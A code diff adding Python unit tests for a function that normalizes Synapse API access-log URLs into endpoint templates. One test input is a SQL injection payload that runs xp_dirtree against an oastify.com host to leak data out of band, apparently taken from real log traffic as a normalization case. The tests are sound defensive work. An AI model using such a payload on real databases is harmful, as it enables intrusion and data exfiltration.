@@ -38,6 +38,151 @@ class TestTransformedAccessRecord(unittest.TestCase):
         real_output = process_access_record.get_normalized_method_signature("repo/v1/admin/locks")
         self.assertEqual(expected_output, real_output)
 
+    def test_normalized_signature_with_space_at_end(self):
+        expected_output = "/entity/#"
+        real_output = process_access_record.get_normalized_method_signature("/repo/v1/entity/syn35487770%20")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_space_before_synId(self):
+        expected_output = "/entity/#/annotations2"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/repo/v1/entity/%20syn24829449/annotations2")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_space_in_middle(self):
+        expected_output = "/entity/#/uploaddestination"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/file/v1/entity/syn52201498%20%20/uploadDestination")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_squareBracket(self):
+        expected_output = "/accessrequirement/#/submissions"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/repo/v1/accessRequirement/%5B9605670%5D/submissions")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_synId_with_version(self):
+        expected_output = "/entity/#/table/transaction/async/get/#"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/repo/v1/entity/syn51718024.1/table/transaction/async/get/28738082")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_special_char_at_end(self):
+        expected_output = "/entity/#/wiki/#"
+        real_output = process_access_record.get_normalized_method_signature("/repo/v1/entity/syn6131484/wiki/402033@")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_semicolon_with_url(self):
+        expected_output = "/entity/#/wiki/#"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/repo/v1/entity/syn4939906/wiki/235909;%20Combination%20Index%20Validation%20Studies%20(2%20drug%20combinations)%20-%20syn4939876%20-%20Wiki%20(Synapse | Sage Bionetworks ")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_semicolon_with_text(self):
+        expected_output = "/entity/#/wiki/"
+        real_output = process_access_record.get_normalized_method_signature("/repo/v1/entity/syn3193805/wiki/;D12")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_semicolon_in_middle(self):
+        expected_output = "/entity/#/wiki2/#/wikihistory"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/repo/v1/entity/syn2811262/wiki2/78388;/wikihistory")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_semicolon_in_middle_with_text(self):
+        expected_output = "/entity/#/wiki2/#/wikihistory"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/repo/v1/entity/syn2811262/wiki2/78388;DA12/wikihistory")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_new_line(self):
+        expected_output = "/entity/#/uploaddestination"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/file/v1/entity/syn51320810%0A/uploadDestination")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_multiple_new_line(self):
+        expected_output = "/entity/#/bundle2"
+        real_output = process_access_record.get_normalized_method_signature("/repo/v1/entity/syn26592177%0A%0A/bundle2")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_carriageReturn(self):
+        expected_output = "/entity/#/annotations2"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/repo/v1/entity/syn50920803%0D%0D/annotations2")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_multiple_carriageReturn(self):
+        expected_output = "/entity/#/bundle2"
+        real_output = process_access_record.get_normalized_method_signature("/repo/v1/entity/syn50920803%0D%0D/bundle2")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_with_carriageReturn_before_synId(self):
+        expected_output = "/entity/#/uploaddestination"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/file/v1/entity/%09%0Asyn51770520/uploadDestination")
+        print("print its working")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_drs_access_url_with_synId(self):
+        expected_output = "/objects/#/access/#"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/ga4gh/drs/v1/objects/syn27076339.1/access/FileEntity_syn27076339.1_88312772")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_drs_access_url_with_filehandleId(self):
+        expected_output = "/objects/#/access/#"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/ga4gh/drs/v1/objects/fh127243131/access/127243131")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_drs_object(self):
+        expected_output = "/objects/#"
+        real_output = process_access_record.get_normalized_method_signature("/ga4gh/drs/v1/objects/syn35423183.1")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_schema_type(self):
+        expected_output = "/schema/type/#"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/repo/v1/schema/type/registered/a245ac37480fc40739836ce61801d19f1-my.schema-0.36652.1")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_team_with_singleQuotes(self):
+        expected_output = "/team/#"
+        real_output = process_access_record.get_normalized_method_signature("/repo/v1/team/3409011'")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_team_with_bracket(self):
+        expected_output = "/team/#"
+        real_output = process_access_record.get_normalized_method_signature("/repo/v1/team/3409011)")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_team_with_comma(self):
+        expected_output = "/team/#"
+        real_output = process_access_record.get_normalized_method_signature("/repo/v1/team/3409011,")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_team_with_dot(self):
+        expected_output = "/team/#"
+        real_output = process_access_record.get_normalized_method_signature("/repo/v1/team/3409011.")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_bundle(self):
+        expected_output = "/user/bundle"
+        real_output = process_access_record.get_normalized_method_signature(
+            "/repo/v1/user/bundle;declare%20@q%20varchar(99);set%20@q='%5C%5Cb2eg7v959m35phq0mzthfsysajgf491a0yroff72xqm.oasti'+'fy.com%5Cfmt';%20exec%20master.dbo.xp_dirtree%20@q;--%20")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_twoFA(self):
+        expected_output = "/2fa/enroll"
+        real_output = process_access_record.get_normalized_method_signature("/auth/v1/2fa/enroll")
+        self.assertEqual(expected_output, real_output)
+
+    def test_normalized_signature_for_twoFA(self):
+        expected_output = "/2fa/enroll"
+        real_output = process_access_record.get_normalized_method_signature("/auth/v1/2fa/enroll")
+        self.assertEqual(expected_output, real_output)
+
     def test_get_client_for_web(self):
         expected_output = "WEB"
         real_output = process_access_record.get_client("Synapse-Web-Client/435.0")
